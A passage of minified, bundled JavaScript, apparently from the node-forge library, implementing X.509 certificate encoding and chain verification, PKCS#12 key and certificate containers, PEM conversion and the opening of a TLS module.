i["RSASSA-PSS"]:var C=[];return E.hash.algorithmOid!==void 0&&C.push(e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(E.hash.algorithmOid).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.NULL,!1,"")])])),E.mgf.algorithmOid!==void 0&&C.push(e.create(e.Class.CONTEXT_SPECIFIC,1,!0,[e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(E.mgf.algorithmOid).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(E.mgf.hash.algorithmOid).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.NULL,!1,"")])])])),E.saltLength!==void 0&&C.push(e.create(e.Class.CONTEXT_SPECIFIC,2,!0,[e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,e.integerToDer(E.saltLength).getBytes())])),e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,C);default:return e.create(e.Class.UNIVERSAL,e.Type.NULL,!1,"")}}function x(I){var E=e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[]);if(I.attributes.length===0)return E;for(var C=I.attributes,N=0;N<C.length;++N){var L=C[N],$=L.value,y=e.Type.UTF8;"valueTagClass"in L&&(y=L.valueTagClass),y===e.Type.UTF8&&($=r.util.encodeUtf8($));var A=!1;"valueConstructed"in L&&(A=L.valueConstructed);var b=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(L.type).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.SET,!0,[e.create(e.Class.UNIVERSAL,y,A,$)])]);E.value.push(b)}return E}var S=new Date("1950-01-01T00:00:00Z"),T=new Date("2050-01-01T00:00:00Z");function k(I){return I>=S&&I<T?e.create(e.Class.UNIVERSAL,e.Type.UTCTIME,!1,e.dateToUtcTime(I)):e.create(e.Class.UNIVERSAL,e.Type.GENERALIZEDTIME,!1,e.dateToGeneralizedTime(I))}return t.getTBSCertificate=function(I){var E=k(I.validity.notBefore),C=k(I.validity.notAfter),N=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,e.integerToDer(I.version).getBytes())]),e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,r.util.hexToBytes(I.serialNumber)),e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(I.siginfo.algorithmOid).getBytes()),m(I.siginfo.algorithmOid,I.siginfo.parameters)]),p(I.issuer),e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[E,C]),p(I.subject),t.publicKeyToAsn1(I.publicKey)]);return I.issuer.uniqueId&&N.value.push(e.create(e.Class.CONTEXT_SPECIFIC,1,!0,[e.create(e.Class.UNIVERSAL,e.Type.BITSTRING,!1,"\0"+I.issuer.uniqueId)])),I.subject.uniqueId&&N.value.push(e.create(e.Class.CONTEXT_SPECIFIC,2,!0,[e.create(e.Class.UNIVERSAL,e.Type.BITSTRING,!1,"\0"+I.subject.uniqueId)])),I.extensions.length>0&&N.value.push(t.certificateExtensionsToAsn1(I.extensions)),N},t.getCertificationRequestInfo=function(I){var E=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,e.integerToDer(I.version).getBytes()),p(I.subject),t.publicKeyToAsn1(I.publicKey),x(I)]);return E},t.distinguishedNameToAsn1=function(I){return p(I)},t.certificateToAsn1=function(I){var E=I.tbsCertificate||t.getTBSCertificate(I);return e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[E,e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(I.signatureOid).getBytes()),m(I.signatureOid,I.signatureParameters)]),e.create(e.Class.UNIVERSAL,e.Type.BITSTRING,!1,"\0"+I.signature)])},t.certificateExtensionsToAsn1=function(I){var E=e.create(e.Class.CONTEXT_SPECIFIC,3,!0,[]),C=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[]);E.value.push(C);for(var N=0;N<I.length;++N)C.value.push(t.certificateExtensionToAsn1(I[N]));return E},t.certificateExtensionToAsn1=function(I){var E=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[]);E.value.push(e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(I.id).getBytes())),I.critical&&E.value.push(e.create(e.Class.UNIVERSAL,e.Type.BOOLEAN,!1,""));var C=I.value;return typeof I.value!="string"&&(C=e.toDer(C).getBytes()),E.value.push(e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,C)),E},t.certificationRequestToAsn1=function(I){var E=I.certificationRequestInfo||t.getCertificationRequestInfo(I);return e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[E,e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(I.signatureOid).getBytes()),m(I.signatureOid,I.signatureParameters)]),e.create(e.Class.UNIVERSAL,e.Type.BITSTRING,!1,"\0"+I.signature)])},t.createCaStore=function(I){var E={certs:{}};E.getIssuer=function(y){var A=C(y.issuer);return A},E.addCertificate=function(y){if(typeof y=="string"&&(y=r.pki.certificateFromPem(y)),N(y.subject),!E.hasCertificate(y))if(y.subject.hash in E.certs){var A=E.certs[y.subject.hash];r.util.isArray(A)||(A=[A]),A.push(y),E.certs[y.subject.hash]=A}else E.certs[y.subject.hash]=y},E.hasCertificate=function(y){typeof y=="string"&&(y=r.pki.certificateFromPem(y));var A=C(y.subject);if(!A)return!1;r.util.isArray(A)||(A=[A]);for(var b=e.toDer(t.certificateToAsn1(y)).getBytes(),v=0;v<A.length;++v){var _=e.toDer(t.certificateToAsn1(A[v])).getBytes();if(b===_)return!0}return!1},E.listAllCertificates=function(){var y=[];for(var A in E.certs)if(E.certs.hasOwnProperty(A)){var b=E.certs[A];if(!r.util.isArray(b))y.push(b);else for(var v=0;v<b.length;++v)y.push(b[v])}return y},E.removeCertificate=function(y){var A;if(typeof y=="string"&&(y=r.pki.certificateFromPem(y)),N(y.subject),!E.hasCertificate(y))return null;var b=C(y.subject);if(!r.util.isArray(b))return A=E.certs[y.subject.hash],delete E.certs[y.subject.hash],A;for(var v=e.toDer(t.certificateToAsn1(y)).getBytes(),_=0;_<b.length;++_){var O=e.toDer(t.certificateToAsn1(b[_])).getBytes();v===O&&(A=b[_],b.splice(_,1))}return b.length===0&&delete E.certs[y.subject.hash],A};function C(y){return N(y),E.certs[y.hash]||null}function N(y){if(!y.hash){var A=r.md.sha1.create();y.attributes=t.RDNAttributesAsArray(p(y),A),y.hash=A.digest().toHex()}}if(I)for(var L=0;L<I.length;++L){var $=I[L];E.addCertificate($)}return E},t.certificateError={bad_certificate:"forge.pki.BadCertificate",unsupported_certificate:"forge.pki.UnsupportedCertificate",certificate_revoked:"forge.pki.CertificateRevoked",certificate_expired:"forge.pki.CertificateExpired",certificate_unknown:"forge.pki.CertificateUnknown",unknown_ca:"forge.pki.UnknownCertificateAuthority"},t.verifyCertificateChain=function(I,E,C){typeof C=="function"&&(C={verify:C}),C=C||{},E=E.slice(0);var N=E.slice(0),L=C.validityCheckDate;typeof L>"u"&&(L=new Date);var $=!0,y=null,A=0;do{var b=E.shift(),v=null,_=!1;if(L&&(L<b.validity.notBefore||L>b.validity.notAfter)&&(y={message:"Certificate is not valid yet or has expired.",error:t.certificateError.certificate_expired,notBefore:b.validity.notBefore,notAfter:b.validity.notAfter,now:L}),y===null){if(v=E[0]||I.getIssuer(b),v===null&&b.isIssuer(b)&&(_=!0,v=b),v){var O=v;r.util.isArray(O)||(O=[O]);for(var D=!1;!D&&O.length>0;){v=O.shift();try{D=v.verify(b)}catch{}}D||(y={message:"Certificate signature is invalid.",error:t.certificateError.bad_certificate})}y===null&&(!v||_)&&!I.hasCertificate(b)&&(y={message:"Certificate is not trusted.",error:t.certificateError.unknown_ca})}if(y===null&&v&&!b.isIssuer(v)&&(y={message:"Certificate issuer is invalid.",error:t.certificateError.bad_certificate}),y===null)for(var R={keyUsage:!0,basicConstraints:!0},P=0;y===null&&P<b.extensions.length;++P){var B=b.extensions[P];B.critical&&!(B.name in R)&&(y={message:"Certificate has an unsupported critical extension.",error:t.certificateError.unsupported_certificate})}if(y===null&&(!$||E.length===0&&(!v||_))){var M=b.getExtension("basicConstraints"),W=b.getExtension("keyUsage");if(W!==null&&(!W.keyCertSign||M===null)&&(y={message:"Certificate keyUsage or basicConstraints conflict or indicate that the certificate is not a CA. If the certificate is the only one in the chain or isn't the first then the certificate must be a valid CA.",error:t.certificateError.bad_certificate}),y===null&&M!==null&&!M.cA&&(y={message:"Certificate basicConstraints indicates the certificate is not a CA.",error:t.certificateError.bad_certificate}),y===null&&W!==null&&"pathLenConstraint"in M){var K=A-1;K>M.pathLenConstraint&&(y={message:"Certificate basicConstraints pathLenConstraint violated.",error:t.certificateError.bad_certificate})}}var q=y===null?!0:y.error,J=C.verify?C.verify(q,A,N):q;if(J===!0)y=null;else throw q===!0&&(y={message:"The application rejected the certificate.",error:t.certificateError.bad_certificate}),(J||J===0)&&(typeof J=="object"&&!r.util.isArray(J)?(J.message&&(y.message=J.message),J.error&&(y.error=J.error)):typeof J=="string"&&(y.error=J)),y;$=!1,++A}while(E.length>0);return!0},U_.exports}var YD;function yJ(){if(YD)return D_.exports;YD=1;var r=Lr();Yd(),r4(),e2(),bJ(),wJ(),Au(),Jx(),i4(),Ei(),V$();var e=r.asn1,t=r.pki,i=D_.exports=r.pkcs12=r.pkcs12||{},n={name:"ContentInfo",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"ContentInfo.contentType",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"contentType"},{name:"ContentInfo.content",tagClass:e.Class.CONTEXT_SPECIFIC,constructed:!0,captureAsn1:"content"}]},s={name:"PFX",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"PFX.version",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1,capture:"version"},n,{name:"PFX.macData",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,optional:!0,captureAsn1:"mac",value:[{name:"PFX.macData.mac",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"PFX.macData.mac.digestAlgorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"PFX.macData.mac.digestAlgorithm.algorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"macAlgorithm"},{name:"PFX.macData.mac.digestAlgorithm.parameters",tagClass:e.Class.UNIVERSAL,captureAsn1:"macAlgorithmParameters"}]},{name:"PFX.macData.mac.digest",tagClass:e.Class.UNIVERSAL,type:e.Type.OCTETSTRING,constructed:!1,capture:"macDigest"}]},{name:"PFX.macData.macSalt",tagClass:e.Class.UNIVERSAL,type:e.Type.OCTETSTRING,constructed:!1,capture:"macSalt"},{name:"PFX.macData.iterations",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1,optional:!0,capture:"macIterations"}]}]},o={name:"SafeBag",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"SafeBag.bagId",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"bagId"},{name:"SafeBag.bagValue",tagClass:e.Class.CONTEXT_SPECIFIC,constructed:!0,captureAsn1:"bagValue"},{name:"SafeBag.bagAttributes",tagClass:e.Class.UNIVERSAL,type:e.Type.SET,constructed:!0,optional:!0,capture:"bagAttributes"}]},a={name:"Attribute",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"Attribute.attrId",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"oid"},{name:"Attribute.attrValues",tagClass:e.Class.UNIVERSAL,type:e.Type.SET,constructed:!0,capture:"values"}]},c={name:"CertBag",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"CertBag.certId",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"certId"},{name:"CertBag.certValue",tagClass:e.Class.CONTEXT_SPECIFIC,constructed:!0,value:[{name:"CertBag.certValue[0]",tagClass:e.Class.UNIVERSAL,type:e.Class.OCTETSTRING,constructed:!1,capture:"cert"}]}]};function l(g,w,m,x){for(var S=[],T=0;T<g.length;T++)for(var k=0;k<g[T].safeBags.length;k++){var I=g[T].safeBags[k];if(!(x!==void 0&&I.type!==x)){if(w===null){S.push(I);continue}I.attributes[w]!==void 0&&I.attributes[w].indexOf(m)>=0&&S.push(I)}}return S}i.pkcs12FromAsn1=function(g,w,m){typeof w=="string"?(m=w,w=!0):w===void 0&&(w=!0);var x={},S=[];if(!e.validate(g,s,x,S)){var T=new Error("Cannot read PKCS#12 PFX. ASN.1 object is not an PKCS#12 PFX.");throw T.errors=T,T}var k={version:x.version.charCodeAt(0),safeContents:[],getBags:function(v){var _={},O;return"localKeyId"in v?O=v.localKeyId:"localKeyIdHex"in v&&(O=r.util.hexToBytes(v.localKeyIdHex)),O===void 0&&!("friendlyName"in v)&&"bagType"in v&&(_[v.bagType]=l(k.safeContents,null,null,v.bagType)),O!==void 0&&(_.localKeyId=l(k.safeContents,"localKeyId",O,v.bagType)),"friendlyName"in v&&(_.friendlyName=l(k.safeContents,"friendlyName",v.friendlyName,v.bagType)),_},getBagsByFriendlyName:function(v,_){return l(k.safeContents,"friendlyName",v,_)},getBagsByLocalKeyId:function(v,_){return l(k.safeContents,"localKeyId",v,_)}};if(x.version.charCodeAt(0)!==3){var T=new Error("PKCS#12 PFX of version other than 3 not supported.");throw T.version=x.version.charCodeAt(0),T}if(e.derToOid(x.contentType)!==t.oids.data){var T=new Error("Only PKCS#12 PFX in password integrity mode supported.");throw T.oid=e.derToOid(x.contentType),T}var I=x.content.value[0];if(I.tagClass!==e.Class.UNIVERSAL||I.type!==e.Type.OCTETSTRING)throw new Error("PKCS#12 authSafe content data is not an OCTET STRING.");if(I=u(I),x.mac){var E=null,C=0,N=e.derToOid(x.macAlgorithm);switch(N){case t.oids.sha1:E=r.md.sha1.create(),C=20;break;case t.oids.sha256:E=r.md.sha256.create(),C=32;break;case t.oids.sha384:E=r.md.sha384.create(),C=48;break;case t.oids.sha512:E=r.md.sha512.create(),C=64;break;case t.oids.md5:E=r.md.md5.create(),C=16;break}if(E===null)throw new Error("PKCS#12 uses unsupported MAC algorithm: "+N);var L=new r.util.ByteBuffer(x.macSalt),$="macIterations"in x?parseInt(r.util.bytesToHex(x.macIterations),16):1,y=i.generateKey(m,L,3,$,C,E),A=r.hmac.create();A.start(E,y),A.update(I.value);var b=A.getMac();if(b.getBytes()!==x.macDigest)throw new Error("PKCS#12 MAC could not be verified. Invalid password?")}return d(k,I.value,w,m),k};function u(g){if(g.composed||g.constructed){for(var w=r.util.createBuffer(),m=0;m<g.value.length;++m)w.putBytes(g.value[m].value);g.composed=g.constructed=!1,g.value=w.getBytes()}return g}function d(g,w,m,x){if(w=e.fromDer(w,m),w.tagClass!==e.Class.UNIVERSAL||w.type!==e.Type.SEQUENCE||w.constructed!==!0)throw new Error("PKCS#12 AuthenticatedSafe expected to be a SEQUENCE OF ContentInfo");for(var S=0;S<w.value.length;S++){var T=w.value[S],k={},I=[];if(!e.validate(T,n,k,I)){var E=new Error("Cannot read ContentInfo.");throw E.errors=I,E}var C={encrypted:!1},N=null,L=k.content.value[0];switch(e.derToOid(k.contentType)){case t.oids.data:if(L.tagClass!==e.Class.UNIVERSAL||L.type!==e.Type.OCTETSTRING)throw new Error("PKCS#12 SafeContents Data is not an OCTET STRING.");N=u(L).value;break;case t.oids.encryptedData:N=h(L,x),C.encrypted=!0;break;default:var E=new Error("Unsupported PKCS#12 contentType.");throw E.contentType=e.derToOid(k.contentType),E}C.safeBags=f(N,m,x),g.safeContents.push(C)}}function h(g,w){var m={},x=[];if(!e.validate(g,r.pkcs7.asn1.encryptedDataValidator,m,x)){var S=new Error("Cannot read EncryptedContentInfo.");throw S.errors=x,S}var T=e.derToOid(m.contentType);if(T!==t.oids.data){var S=new Error("PKCS#12 EncryptedContentInfo ContentType is not Data.");throw S.oid=T,S}T=e.derToOid(m.encAlgorithm);var k=t.pbe.getCipher(T,m.encParameter,w),I=u(m.encryptedContentAsn1),E=r.util.createBuffer(I.value);if(k.update(E),!k.finish())throw new Error("Failed to decrypt PKCS#12 SafeContents.");return k.output.getBytes()}function f(g,w,m){if(!w&&g.length===0)return[];if(g=e.fromDer(g,w),g.tagClass!==e.Class.UNIVERSAL||g.type!==e.Type.SEQUENCE||g.constructed!==!0)throw new Error("PKCS#12 SafeContents expected to be a SEQUENCE OF SafeBag.");for(var x=[],S=0;S<g.value.length;S++){var T=g.value[S],k={},I=[];if(!e.validate(T,o,k,I)){var E=new Error("Cannot read SafeBag.");throw E.errors=I,E}var C={type:e.derToOid(k.bagId),attributes:p(k.bagAttributes)};x.push(C);var N,L,$=k.bagValue.value[0];switch(C.type){case t.oids.pkcs8ShroudedKeyBag:if($=t.decryptPrivateKeyInfo($,m),$===null)throw new Error("Unable to decrypt PKCS#8 ShroudedKeyBag, wrong password?");case t.oids.keyBag:try{C.key=t.privateKeyFromAsn1($)}catch{C.key=null,C.asn1=$}continue;case t.oids.certBag:N=c,L=function(){if(e.derToOid(k.certId)!==t.oids.x509Certificate){var A=new Error("Unsupported certificate type, only X.509 supported.");throw A.oid=e.derToOid(k.certId),A}var b=e.fromDer(k.cert,w);try{C.cert=t.certificateFromAsn1(b,!0)}catch{C.cert=null,C.asn1=b}};break;default:var E=new Error("Unsupported PKCS#12 SafeBag type.");throw E.oid=C.type,E}if(N!==void 0&&!e.validate($,N,k,I)){var E=new Error("Cannot read PKCS#12 "+N.name);throw E.errors=I,E}L()}return x}function p(g){var w={};if(g!==void 0)for(var m=0;m<g.length;++m){var x={},S=[];if(!e.validate(g[m],a,x,S)){var T=new Error("Cannot read PKCS#12 BagAttribute.");throw T.errors=S,T}var k=e.derToOid(x.oid);if(t.oids[k]!==void 0){w[t.oids[k]]=[];for(var I=0;I<x.values.length;++I)w[t.oids[k]].push(x.values[I].value)}}return w}return i.toPkcs12Asn1=function(g,w,m,x){x=x||{},x.saltSize=x.saltSize||8,x.count=x.count||2048,x.algorithm=x.algorithm||x.encAlgorithm||"aes128","useMac"in x||(x.useMac=!0),"localKeyId"in x||(x.localKeyId=null),"generateLocalKeyId"in x||(x.generateLocalKeyId=!0);var S=x.localKeyId,T;if(S!==null)S=r.util.hexToBytes(S);else if(x.generateLocalKeyId)if(w){var k=r.util.isArray(w)?w[0]:w;typeof k=="string"&&(k=t.certificateFromPem(k));var I=r.md.sha1.create();I.update(e.toDer(t.certificateToAsn1(k)).getBytes()),S=I.digest().getBytes()}else S=r.random.getBytes(20);var E=[];S!==null&&E.push(e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(t.oids.localKeyId).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.SET,!0,[e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,S)])])),"friendlyName"in x&&E.push(e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(t.oids.friendlyName).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.SET,!0,[e.create(e.Class.UNIVERSAL,e.Type.BMPSTRING,!1,x.friendlyName)])])),E.length>0&&(T=e.create(e.Class.UNIVERSAL,e.Type.SET,!0,E));var C=[],N=[];w!==null&&(r.util.isArray(w)?N=w:N=[w]);for(var L=[],$=0;$<N.length;++$){w=N[$],typeof w=="string"&&(w=t.certificateFromPem(w));var y=$===0?T:void 0,A=t.certificateToAsn1(w),b=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(t.oids.certBag).getBytes()),e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(t.oids.x509Certificate).getBytes()),e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,e.toDer(A).getBytes())])])]),y]);L.push(b)}if(L.length>0){var v=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,L),_=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(t.oids.data).getBytes()),e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,e.toDer(v).getBytes())])]);C.push(_)}var O=null;if(g!==null){var D=t.wrapRsaPrivateKey(t.privateKeyToAsn1(g));m===null?O=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(t.oids.keyBag).getBytes()),e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[D]),T]):O=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(t.oids.pkcs8ShroudedKeyBag).getBytes()),e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[t.encryptPrivateKeyInfo(D,m,x)]),T]);var R=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[O]),P=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(t.oids.data).getBytes()),e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,e.toDer(R).getBytes())])]);C.push(P)}var B=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,C),M;if(x.useMac){var I=r.md.sha1.create(),W=new r.util.ByteBuffer(r.random.getBytes(x.saltSize)),K=x.count,g=i.generateKey(m,W,3,K,20),q=r.hmac.create();q.start(I,g),q.update(e.toDer(B).getBytes());var J=q.getMac();M=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(t.oids.sha1).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.NULL,!1,"")]),e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,J.getBytes())]),e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,W.getBytes()),e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,e.integerToDer(K).getBytes())])}return e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,e.integerToDer(3).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(t.oids.data).getBytes()),e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,e.toDer(B).getBytes())])]),M])},i.generateKey=r.pbe.generatePkcs12Key,D_.exports}var JD;function xJ(){if(JD)return A_.exports;JD=1;var r=Lr();Yd(),e2(),wJ(),E3(),W$(),yJ(),H$(),Jx(),Ei(),V$();var e=r.asn1,t=A_.exports=r.pki=r.pki||{};return t.pemToDer=function(i){var n=r.pem.decode(i)[0];if(n.procType&&n.procType.type==="ENCRYPTED")throw new Error("Could not convert PEM to DER; PEM is encrypted.");return r.util.createBuffer(n.body)},t.privateKeyFromPem=function(i){var n=r.pem.decode(i)[0];if(n.type!=="PRIVATE KEY"&&n.type!=="RSA PRIVATE KEY"){var s=new Error('Could not convert private key from PEM; PEM header type is not "PRIVATE KEY" or "RSA PRIVATE KEY".');throw s.headerType=n.type,s}if(n.procType&&n.procType.type==="ENCRYPTED")throw new Error("Could not convert private key from PEM; PEM is encrypted.");var o=e.fromDer(n.body);return t.privateKeyFromAsn1(o)},t.privateKeyToPem=function(i,n){var s={type:"RSA PRIVATE KEY",body:e.toDer(t.privateKeyToAsn1(i)).getBytes()};return r.pem.encode(s,{maxline:n})},t.privateKeyInfoToPem=function(i,n){var s={type:"PRIVATE KEY",body:e.toDer(i).getBytes()};return r.pem.encode(s,{maxline:n})},A_.exports}var z_,QD;function CJ(){if(QD)return z_;QD=1;var r=Lr();Yd(),r4(),z$(),E3(),xJ(),Au(),i4(),Ei();var e=function(U,G,Z,j){var Y=r.util.createBuffer(),se=U.length>>1,ne=se+(U.length&1),Te=U.substr(0,ne),Re=U.substr(se,ne),$e=r.util.createBuffer(),Ae=r.hmac.create();Z=G+Z;var De=Math.ceil(j/16),Le=Math.ceil(j/20);Ae.start("MD5",Te);var it=r.util.createBuffer();$e.putBytes(Z);for(var nt=0;nt<De;++nt)Ae.start(null,null),Ae.update($e.getBytes()),$e.putBuffer(Ae.digest()),Ae.start(null,null),Ae.update($e.bytes()+Z),it.putBuffer(Ae.digest());Ae.start("SHA1",Re);var ct=r.util.createBuffer();$e.clear(),$e.putBytes(Z);for(var nt=0;nt<Le;++nt)Ae.start(null,null),Ae.update($e.getBytes()),$e.putBuffer(Ae.digest()),Ae.start(null,null),Ae.update($e.bytes()+Z),ct.putBuffer(Ae.digest());return Y.putBytes(r.util.xorBytes(it.getBytes(),ct.getBytes(),j)),Y},t=function(U,G,Z){var j=r.hmac.create();j.start("SHA1",U);var Y=r.util.createBuffer();return Y.putInt32(G[0]),Y.putInt32(G[1]),Y.putByte(Z.type),Y.putByte(Z.version.major),Y.putByte(Z.version.minor),Y.putInt16(Z.length),Y.putBytes(Z.fragment.bytes()),j.update(Y.getBytes()),j.digest().getBytes()},i=function(U,G,Z){var j=!1;try{var Y=U.deflate(G.fragment.getBytes());G.fragment=r.util.createBuffer(Y),G.length=Y.length,j=!0}catch{}return j},n=function(U,G,Z){var j=!1;try{var Y=U.inflate(G.fragment.getBytes());G.fragment=r.util.createBuffer(Y),G.length=Y.length,j=!0}catch{}return j},s=function(U,G){var Z=0;switch(G){case 1:Z=U.getByte();break;case 2:Z=U.getInt16();break;case 3:Z=U.getInt24();break;case 4:Z=U.getInt32();break}return r.util.createBuffer(U.getBytes(Z))},o=function(U,G,Z){U.putInt(Z.length(),G<<3),U.putBuffer(Z)},a={};a.Versions={TLS_1_0:{major:3,minor:1},TLS_1_1:{major:3,minor:2},TLS_1_2:{major:3,minor:3}},a.SupportedVersions=[a.Versions.TLS_1_1,a.Versions.TLS_1_0],a.Version=a.SupportedVersions[0],a.MaxFragment=15360,a.ConnectionEnd={server:0,client:1},a.PRFAlgorithm={tls_prf_sha256:0},a.BulkCipherAlgorithm={none:null,rc4:0,des3:1,aes:2},a.CipherType={stream:0,block:1,aead:2},a.MACAlgorithm={none:null,hmac_md5:0,hmac_sha1:1,hmac_sha256:2,hmac_sha384:3,hmac_sha512:4},a.CompressionMethod={none:0,deflate:1},a.ContentType={change_cipher_spec:20,alert:21,handshake:22,application_data:23,heartbeat:24},a.HandshakeType={hello_request:0,client_hello:1,server_hello:2,certificate:11,server_key_exchange:12,certificate_request:13,server_hello_done:14,certificate_verify:15,client_key_exchange:16,finished:20},a.Alert={},a.Alert.Level={warning:1,fatal:2},a.Alert.Description={close_notify:0,unexpected_message:10,bad_record_mac:20,decryption_failed:21,record_overflow:22,decompression_failure:30,handshake_failure:40,bad_certificate:42,unsupported_certificate:43,certificate_revoked:44,certificate_expired:45,certificate_unknown:46,illegal_parameter:47,unknown_ca:48,access_denied:49,decode_error:50,decrypt_error:51,export_restriction:60,protocol_version:70,insufficient_security:71,internal_error:80,user_canceled:90,no_renegotiation:100},a.HeartbeatMessageType={heartbeat_request:1,heartbeat_response:2},a.CipherSuites={},a.getCipherSuite=function(U){var G=null;for(var Z in a.CipherSuites){var j=a.CipherSuites[Z];if(j.id[0]===U.charCodeAt(0)&&j.id[1]===U.charCodeAt(1)){G=j;break}}return G},a.handleUnexpected=function(U,G){var Z=!U.open&&U.entity===a.ConnectionEnd.client;Z||U.error(U,{message:"Unexpected message. Received TLS record out of order.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.unexpected_message}})},a.handleHelloRequest=function(U,G,Z){!U.handshaking&&U.handshakes>0&&(a.queue(U,a.createAlert(U,{level:a.Alert.Level.warning,description:a.Alert.Description.no_renegotiation})),a.flush(U)),U.process()},a.parseHelloMessage=function(U,G,Z){var j=null,Y=U.entity===a.ConnectionEnd.client;if(Z<38)U.error(U,{message:Y?"Invalid ServerHello message. Message too short.":"Invalid ClientHello message. Message too 